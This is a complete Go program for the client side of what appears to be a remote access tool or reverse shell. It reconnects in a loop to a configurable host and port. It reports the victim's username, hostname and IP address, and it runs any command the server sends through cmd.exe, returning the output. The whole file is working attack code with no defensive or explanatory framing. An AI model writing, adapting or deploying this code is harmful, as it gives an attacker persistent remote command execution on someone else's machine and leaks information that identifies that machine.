package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

func main() {
	serverAddr := "127.0.0.1"
	port := "1337"

	if len(os.Args) > 1 {
		serverAddr = os.Args[1]
	}
	if len(os.Args) > 2 {
		port = os.Args[2]
	}

	for {
		conn, err := net.Dial("tcp", serverAddr+":"+port)
		if err != nil {
			fmt.Printf("[CLIENT] Failed to connect to %s:%s. Retrying in 5s...\n", serverAddr, port)
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Println("[CLIENT] Connected to server at", serverAddr+":"+port)

		if err := sendInitialInfo(conn); err != nil {
			conn.Close()
			time.Sleep(5 * time.Second)
			continue
		}

		handleServer(conn)

		fmt.Println("[CLIENT] Connection lost. Reconnecting in 5s...")
		time.Sleep(5 * time.Second)
	}
}

// sendInitialInfo sends basic client identification data after connection
func sendInitialInfo(conn net.Conn) error {
	userObj, _ := user.Current()
	host, _ := os.Hostname()
	ip := getLocalIP()
	info := fmt.Sprintf("%s|%s|%s\n", userObj.Username, host, ip)
	_, err := conn.Write([]byte(info))
	return err
}

// handleServer processes incoming server commands
func handleServer(conn net.Conn) {
	reader := bufio.NewReader(conn)

	for {
		msg, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		msg = strings.TrimSpace(msg)

		switch {
		case msg == "INFO":
			info := gatherInfo()
			conn.Write([]byte(info))
		case strings.HasPrefix(msg, "EXEC:"):
			cmdStr := strings.TrimPrefix(msg, "EXEC:")
			output := execCommand(cmdStr)
			conn.Write([]byte(output + "<END>\n"))
		}
	}
}

// execCommand executes a Windows command and returns its combined output
func execCommand(cmdStr string) string {
	if strings.TrimSpace(cmdStr) == "" {
		return "No command provided"
	}

	c := exec.Command("cmd.exe", "/C", cmdStr)
	out, err := c.CombinedOutput()
	result := strings.TrimSpace(string(out))

	if err != nil {
		return "Error: " + err.Error()
	}
	if result == "" {
		return "Output: (no output)"
	}

	return "Output:\n" + result
}

// gatherInfo collects basic system information on request
func gatherInfo() string {
	userObj, _ := user.Current()
	host, _ := os.Hostname()
	osName := runtime.GOOS
	ram := getRAM()
	ip := getLocalIP()
	return fmt.Sprintf("%s|%s|%s|%s|%s\n", userObj.Username, host, osName, ram, ip)
}

// getRAM is a placeholder for future memory information implementation
func getRAM() string {
	return "-"
}

// getLocalIP returns the first non-loopback IPv4 address of the system
func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "unknown"
}
